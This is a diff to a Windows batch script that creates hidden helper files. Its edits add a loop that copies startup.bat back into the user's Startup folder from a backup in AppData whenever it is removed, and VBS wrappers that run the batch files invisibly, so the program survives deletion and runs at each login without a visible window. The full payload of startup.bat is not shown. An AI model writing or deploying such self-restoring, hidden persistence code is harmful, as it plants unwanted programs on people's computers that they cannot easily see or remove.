@@ -68,6 +68,16 @@ ELSE(
 )
 
 
+If EXIST C:\Users\%username%\AppData\Local\startup.bat (
+	del "C:\Users\%username%\AppData\Local\startup.bat"
+)
+ELSE(
+	ECHO hello
+)
+
+
+
+
 
 	
 REM Makes the batch file invisible so no CMD prompt shows. puts the invisible code in a vbs file.
@@ -105,12 +115,14 @@ ECHO wscript.exe C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs C:\Us
 
 
 type NUL > C:\Users\%username%\Downloads\startup_copier.bat
+ECHO IF EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat" (  >> C:\Users\%username%\Downloads\startup_copier.bat
+ECHO copy /y "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat" "C:\Users\%username%\AppData\Local" >> C:\Users\%username%\Downloads\startup_copier.bat
 ECHO :loop22 >> C:\Users\%username%\Downloads\startup_copier.bat
 ECHO IF EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat" (  >> C:\Users\%username%\Downloads\startup_copier.bat
-ECHO copy /y "C:\Users\%username%\Downloads\startup_copier.bat" "C:\Users\%username%\AppData\Local" >> C:\Users\%username%\Downloads\startup_copier.bat
+ECHO ECHO hello >> C:\Users\%username%\Downloads\startup_copier.bat
 ECHO ) >> C:\Users\%username%\Downloads\startup_copier.bat
 ECHO ELSE( >> C:\Users\%username%\Downloads\startup_copier.bat
-ECHO ECHO hello >> C:\Users\%username%\Downloads\startup_copier.bat
+ECHO copy /y "C:\Users\%username%\Appdata\Local\startup.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" >> C:\Users\%username%\Downloads\startup_copier.bat
 ECHO ) >> C:\Users\%username%\Downloads\startup_copier.bat
 ECHO goto loop22 >> C:\Users\%username%\Downloads\startup_copier.bat
 
@@ -164,7 +176,6 @@ copy /y "C:\Users\%username%\Downloads\mute.vbs" "C:\Users\%username%\AppData\Ro
 copy /y "C:\Users\%username%\Downloads\startup_copier2.bat" "C:\Users\%username%\AppData\Roaming"
 copy /y "C:\Users\%username%\Downloads\startup_copier.bat" "C:\Users\%username%\AppData\Local"
 copy /y "C:\Users\%username%\Downloads\startup.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
-
 
 
 REM After the files above are copied, this code deletes the original created files. This acts as a cut and paste.
